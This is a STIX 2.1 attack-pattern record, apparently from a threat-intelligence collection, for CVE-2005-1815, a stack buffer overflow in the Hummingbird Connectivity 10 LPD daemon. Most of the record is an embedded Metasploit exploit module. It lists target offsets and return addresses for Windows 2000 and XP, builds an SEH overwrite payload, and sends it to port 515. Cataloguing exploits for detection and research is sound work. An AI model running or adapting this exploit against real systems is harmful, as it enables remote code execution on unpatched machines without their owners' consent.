{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--075801c7-0995-450e-ad2a-2bdc2ca0d32a",
    "created": "2024-08-14T16:56:03.088079Z",
    "modified": "2024-08-14T16:56:03.088083Z",
    "name": "Hummingbird Connectivity 10 SP5 LPD Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Hummingbird Connectivity 10 LPD Daemon. This module has only been tested against Hummingbird Exceed v10 with SP5. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/lpd/hummingbird_exceed.rb",
            "external_id": "hummingbird_exceed.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-1815"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Hummingbird Connectivity 10 SP5 LPD Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Hummingbird Connectivity\n        10 LPD Daemon. This module has only been tested against Hummingbird\n        Exceed v10 with SP5.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2005-1815'],\n          ['OSVDB', '16957'],\n          ['BID', '13788'],\n        ],\n      'Privileged'     => true,\n\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 500,\n          'BadChars' => \"\\x00\\x0a\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Windows 2000 English SP0-SP4', { 'Offset' => 1620, 'Ret' => 0x75022ac4 }],\n          ['Windows XP English SP0/SP1',   { 'Offset' => 1596, 'Ret' => 0x71aa2461 }],\n        ],\n\n      'DisclosureDate' => '2005-05-27'))\n\n    register_options( [ Opt::RPORT(515) ])\n  end\n\n  def exploit\n    connect\n\n    filler = rand_text_english(target['Offset'], payload_badchars)\n    seh    = generate_seh_payload(target.ret)\n    sploit = filler + seh\n\n    print_status(\"Trying target #{target.name}...\")\n    sock.put(sploit)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-05-27",
    "x_mitre_platforms": [
        "win'"
    ]
}